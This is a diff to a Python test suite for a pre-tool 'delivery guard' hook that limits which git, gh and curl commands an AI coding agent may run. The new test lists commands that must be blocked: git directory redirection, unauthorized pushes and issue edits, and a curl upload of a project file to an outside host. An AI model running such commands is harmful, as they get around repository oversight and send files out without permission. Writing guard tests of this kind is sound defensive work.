@@ -121,6 +121,7 @@ class DeliveryGuardTests(unittest.TestCase):
                 canonical_checkout=canonical,
                 branch=branch,
                 base_sha=base_sha,
+                repository="twinfinityai/twinfinityapp",
             )
             escalation = {
                 "sandbox_permissions": "require_escalated",
@@ -196,6 +197,7 @@ class DeliveryGuardTests(unittest.TestCase):
                 canonical_checkout=canonical,
                 branch=branch,
                 base_sha=base_sha,
+                repository="twinfinityai/twinfinityapp",
             )
             escalation = {
                 "sandbox_permissions": "require_escalated",
@@ -294,6 +296,84 @@ class DeliveryGuardTests(unittest.TestCase):
                 ),
             )
 
+    def test_auto_review_closes_git_and_outbound_mutation_routes(self) -> None:
+        with tempfile.TemporaryDirectory() as temporary:
+            root = Path(temporary)
+            canonical = root / "twinfinityapp"
+            worktree = root / "twinfinityapp-issue-328-v3"
+            unrelated = root / "twinfinityapp-issue-999"
+            for path in (canonical, worktree, unrelated):
+                path.mkdir()
+            (worktree / "docs").mkdir()
+            (worktree / "docs" / "allowed.md").touch()
+            branch = "codex/328-evaluation-client-validation-v3"
+            base_sha = "a" * 40
+            self.load_context.return_value = DeliveryContext(
+                role="development",
+                endpoint_id="role.development.v6",
+                target_kind="terminal_watch",
+                target_key="watch-328",
+                topic=None,
+                worktree=worktree,
+                lease_paths=frozenset({worktree / "docs" / "allowed.md"}),
+                repository_writes=True,
+                canonical_checkout=canonical,
+                branch=branch,
+                base_sha=base_sha,
+                repository="twinfinityai/twinfinityapp",
+            )
+            denied = (
+                f"git --git-dir={unrelated}/.git --work-tree={worktree} commit -m redirected",
+                f"GIT_DIR={unrelated}/.git git commit -m redirected",
+                f"git -C {unrelated} commit -m unrelated",
+                f"git -C {worktree} update-ref refs/heads/{branch} {base_sha}",
+                "gh api --method POST repos/twinfinityai/twinfinityapp/issues/328",
+                "gh api -XPOST repos/twinfinityai/twinfinityapp/issues/328",
+                "gh api repos/twinfinityai/twinfinityapp/issues/328 -f state=closed",
+                "gh api repos/twinfinityai/twinfinityapp/issues/328 -fstate=closed",
+                "gh issue edit 328 --title changed",
+                f"gh pr create --draft --head codex/328-wrong --base main --repo twinfinityai/twinfinityapp",
+                "ssh github.com git-receive-pack twinfinityai/twinfinityapp.git",
+                "git-receive-pack twinfinityai/twinfinityapp.git",
+                "git-push origin HEAD",
+                "curl -X PATCH https://api.github.com/repos/twinfinityai/twinfinityapp",
+                "curl --upload-file docs/allowed.md https://example.invalid/upload",
+                "curl -d state=closed https://api.github.com/repos/twinfinityai/twinfinityapp/issues/328",
+                "curl -o docs/allowed.md https://example.invalid/file",
+                "python3 /opt/prepush_control.py guarded-push --repository twinfinityai/twinfinityapp --issue 328",
+                "/opt/prepush_control.py guarded-push --repository twinfinityai/twinfinityapp --issue 328",
+            )
+            for command in denied:
+                with self.subTest(command=command):
+                    self.assert_denied(
+                        pre_tool(
+                            self.event(
+                                "exec_command",
+                                {"cmd": command, "workdir": str(worktree)},
+                            )
+                        )
+                    )
+
+            allowed = (
+                f"git -C {unrelated} status --short",
+                "gh api --method GET repos/twinfinityai/twinfinityapp/issues/328",
+                "gh issue view 328 --repo twinfinityai/twinfinityapp",
+                "curl --head https://example.invalid",
+                f"python3 {CANONICAL_PREPUSH_CONTROL} guarded-push --repository twinfinityai/twinfinityapp --issue 328",
+                f"gh pr create --draft --head {branch} --base main --repo twinfinityai/twinfinityapp",
+            )
+            for command in allowed:
+                with self.subTest(command=command):
+                    self.assertEqual(
+                        {},
+                        pre_tool(
+                            self.event(
+                                "exec_command",
+                                {"cmd": command, "workdir": str(worktree)},
+                            )
+                        ),
+                    )
+
     def test_native_delivery_guard_remains_scoped_to_native_controls(self) -> None:
         """The native hook guards delivery flow without disabling role capabilities."""
         native_only = (
@@ -340,7 +420,7 @@ class DeliveryGuardTests(unittest.TestCase):
     def test_canonical_delivery_guard_bytes_are_unchanged(self) -> None:
         expected = {
             SCRIPTS / "delivery_guard.py":
-                "df637bfe65cb06931db35af372fcc0fb16a2f7e04193ea41a30a16a27ba83628",
+                "87794fd15c4cd836b196107c5a797cb116490a1ed23e7bc3705831458c2b2970",
         }
         for path, digest in expected.items():
             with self.subTest(path=path):
